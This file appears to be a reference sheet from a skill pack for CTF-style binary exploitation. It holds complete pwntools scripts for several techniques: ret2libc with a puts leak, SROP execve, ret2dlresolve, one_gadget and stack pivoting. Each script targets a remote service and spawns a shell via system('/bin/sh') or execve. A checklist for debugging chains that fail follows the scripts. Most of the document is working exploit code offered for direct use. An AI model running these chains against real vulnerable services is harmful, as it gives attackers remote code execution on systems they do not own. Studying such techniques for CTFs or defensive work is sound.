# Worked chains

All examples assume the pwntools skeleton (`pwntools` skill) with
`context.binary = elf = ELF("./target")`, offset found via cyclic, and a remote at
`203.0.113.10:1337`. Review every chain with `print(rop.dump())` and step the
first run under gdb (`gdb-debugging` skill: break on the first gadget, `ni`).

## 1. ret2plt leak + ret2libc (amd64, NX, no PIE)

```python
from pwn import *
context.binary = elf = ELF("./target")
libc = ELF("./libc.so.6")
OFFSET = 72
p = remote("203.0.113.10", 1337)

# ---- stage 1: puts(puts@got) ; main() ----
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET     = rop.find_gadget(["ret"])[0]
rop.raw(POP_RDI); rop.raw(elf.got["puts"]); rop.raw(elf.plt["puts"])
rop.raw(elf.symbols["main"])
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))

leak = u64(p.recvline(keepends=False).ljust(8, b"\x00"))
libc.address = leak - libc.symbols["puts"]
log.success(f"libc @ {hex(libc.address)}")
assert libc.address & 0xfff == 0        # else: wrong libc -> `libc-identification`

# ---- stage 2: ret ; system("/bin/sh") ----
rop2 = ROP(libc)
rop2.raw(RET)                           # 16-byte alignment for movaps in system
rop2.raw(POP_RDI); rop2.raw(next(libc.search(b"/bin/sh")))
rop2.raw(libc.symbols["system"])
p.sendlineafter(b"> ", flat({OFFSET: rop2.chain()}))
p.interactive()
```

32-bit variant (args on the stack, no alignment issue):
`flat({OFFSET: [elf.plt["puts"], elf.symbols["main"], elf.got["puts"]]})`, then
stage 2 `[libc.symbols["system"], 0xdeadbeef, next(libc.search(b"/bin/sh"))]`.

Leak via `write` when `puts` is absent (needs rdx≥8, often live from a prior read):
`pop rdi;ret, 1, pop rsi;pop r15;ret, elf.got["write"], 0, elf.plt["write"]`.

## 2. SROP execve (amd64, static or gadget-poor)

Needed: `pop rax ; ret` (or a read returning 15), `syscall`, "/bin/sh" at a known
address (write it with a read() first if absent).

```python
context.binary = elf = ELF("./target")
p = remote("203.0.113.10", 1337)
POP_RAX = 0x41018a          # from find_gadgets.py
SYSCALL = 0x4012dc          # syscall ; ret preferred
BINSH   = elf.bss(0x200)    # we read "/bin/sh\0" here first

# optional pre-stage: read(0, BINSH, 8) via syscall gadgets or a plt read

frame = SigreturnFrame()
frame.rax = constants.SYS_execve     # 59
frame.rdi = BINSH
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL
frame.rsp = elf.bss(0x400)           # anywhere mapped+writable (sane post-state)

payload = flat({OFFSET: [POP_RAX, 15, SYSCALL, bytes(frame)]})
p.sendlineafter(b"> ", payload)
p.interactive()
```

No `pop rax`? Make a `read(0, X, Y)` return exactly 15 by sending 15 bytes — the
syscall return value lands in rax; follow immediately with the syscall gadget.

mprotect variant: `frame.rax = constants.SYS_mprotect`, rdi = page base
(`addr & ~0xfff`), rsi = 0x1000, rdx = 7, `frame.rsp` = address holding a pointer
to your shellcode; then shellcode runs (`pwntools` skill §6 for shellcraft).

## 3. ret2dlresolve (no libc leak, Partial RELRO)

### amd64 (needs pop rdi / pop rsi; rdx often survives from the prior read)

```python
context.binary = elf = ELF("./target")
p = remote("203.0.113.10", 1337)

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop = ROP(elf)
rop.raw(rop.ret.address)                       # alignment
rop.read(0, dlresolve.data_addr)               # uses pop rdi / pop rsi(+r15)
rop.ret2dlresolve(dlresolve)                   # push args, jmp plt0 w/ forged idx
log.info(rop.dump())

p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
p.send(dlresolve.payload)                      # consumed by the read() above
p.interactive()
```

If rdx is garbage and there is no `pop rdx`, use the __libc_csu_init gadget pair
(`ret2csu`) to set rdx, or point the read at a size the leftover rdx already
covers. `dlresolve.payload` must land at exactly `dlresolve.data_addr` — pwntools
computes it near .bss; verify the read target in `rop.dump()`.

### i386 (stack args — works with nothing but the overflow)

```python
context.binary = elf = ELF("./target32")
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop = ROP(elf)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
p.send(dlresolve.payload)
p.interactive()
```

Fails on Full RELRO (DT_JMPREL relocs already resolved, link_map tampering
blocked) and on glibc builds that bound-check the reloc index — then fall back to
a leak-based path.

## 4. one_gadget finish

```python
# after libc.address is known:
ONE = libc.address + 0xe3afe          # from `one_gadget ./libc.so.6`
# satisfy "r15 == NULL": most bins have pop r15 near csu; or pick the rsi/rdx
# candidate and zero them:
rop = ROP(libc)
rop.raw(rop.find_gadget(["pop rsi", "ret"])[0]); rop.raw(0)
rop.raw(ONE)
p.sendlineafter(b"> ", flat({OFFSET: rop.chain()}))
```

Verify constraints live: `GDB` run, `b *<ret-site>`, inspect `$rsi $rdx $r12 $r15`
and `x/4gx $rsp`.

## 5. Stack pivot (16-byte control)

Scenario: `read(0, buf, 0x18)` overflow — only saved RBP + RIP controllable, but
an earlier "name" field of 0x100 bytes is stored at a fixed .bss address.

```python
NAME = 0x4040a0                        # .bss buffer we fully control
LEAVE_RET = 0x40127f                   # leave ; ret

# 1) plant the real chain in NAME via the name prompt:
chain = flat([POP_RDI, elf.got["puts"], elf.plt["puts"], elf.symbols["main"]])
p.sendafter(b"name: ", b"A"*8 + chain)   # first 8 bytes = fake saved rbp slot

# 2) tiny overflow: rbp -> NAME, rip -> leave;ret
#    leave => mov rsp, rbp ; pop rbp  => rsp = NAME+8, pops our junk, ret -> chain
p.sendafter(b"> ", flat({OFFSET - 8: p64(NAME), OFFSET: p64(LEAVE_RET)}))
```

pwntools shorthand: build `rop`, then `rop.migrate(NAME)` emits the pivot for you
(uses leave;ret or pop rsp). Chains that will EXECUTE at a pivoted location must
be built position-aware: `rop.build(base=NAME)` resolves any internal references
as if the chain starts at NAME.

Pivot gadget candidates, in preference order:
`pop rsp ; ret` (clean) > `leave ; ret` (needs rbp control) >
`xchg eax, esp ; ret` (needs eax = target, zero-extends rsp — target must be <4GiB).

Two-stage pivot when nothing is planted yet: pivot into
`read(0, BIG, 0x400) ; migrate(BIG)` built from the few bytes you have, then send
the full chain as the read's data.

## Debugging a dead chain — checklist

1. `rop.dump()` — does every slot resolve? Any `b'iaaa'` filler left?
2. Corefile: `p.corefile.fault_addr` — crash ON a gadget address → that gadget's
   address was mangled (bad bytes? newline split?); crash in libc with
   `movaps` → missing `ret` alignment shim.
3. Off-by-one in OFFSET: canary intact? (`__stack_chk_fail` in the backtrace
   means you clobbered it — leak it first, `format-string-exploitation`).
4. `sendline` added `\x0a` into a `read()`-based second stage → use `send`.
5. Remote works differently → libc mismatch; redo `libc-identification`.
